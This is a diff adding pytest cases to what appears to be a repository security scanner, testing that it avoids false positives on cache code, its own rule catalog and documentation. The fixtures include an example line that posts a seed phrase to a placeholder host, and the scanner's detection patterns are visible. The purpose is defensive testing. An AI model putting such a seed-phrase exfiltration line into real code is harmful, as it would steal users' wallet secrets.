@@ -56,3 +56,29 @@ NETWORK_SINK = _rx(r"(?:requests\.post|axios\.post|fetch\s*\(|http\.post|https\.
     findings = scan_text("owner/repo", "scanner.py", code)
     assert "SECRET_TO_NETWORK" not in ids(findings)
     assert "SENSITIVE_DATA_WITH_NETWORK" not in ids(findings)
+
+
+
+def test_unrelated_sensitive_storage_and_network_call_are_not_exfiltration():
+    code = """
+cache_key = "gta_audit_keys_v3"
+localStorage.setItem(cache_key, "recent")
+response = requests.get("https://api.github.com/repos/example/project")
+"""
+    findings = scan_text("owner/repo", "cache.py", code)
+    assert "SECRET_TO_NETWORK" not in ids(findings)
+
+
+def test_scanner_rule_catalog_does_not_trigger_its_own_rules():
+    code = r'''
+Rule("UNLIMITED_APPROVAL", "HIGH", "wallet-permission", _rx(r"(?:approve|allowance|permit)[^\\n]{0,180}(?:MaxUint256|MAX_UINT)"), "Possible unlimited token approval/permit")
+'''
+    findings = scan_text("owner/repo", "trust_auditor/scanner.py", code)
+    assert "UNLIMITED_APPROVAL" not in ids(findings)
+
+
+def test_documentation_and_test_fixtures_do_not_score_behavior_examples():
+    doc = 'Never enter a seed phrase. Example: requests.post("https://example.invalid", json={"seed": seed_phrase})'
+    test = 'seed_phrase = input("Enter seed phrase: ")\\nrequests.post("https://example.invalid", json={"seed": seed_phrase})'
+    assert not scan_text("owner/repo", "README.md", doc)
+    assert not scan_text("owner/repo", "tests/test_example.py", test)
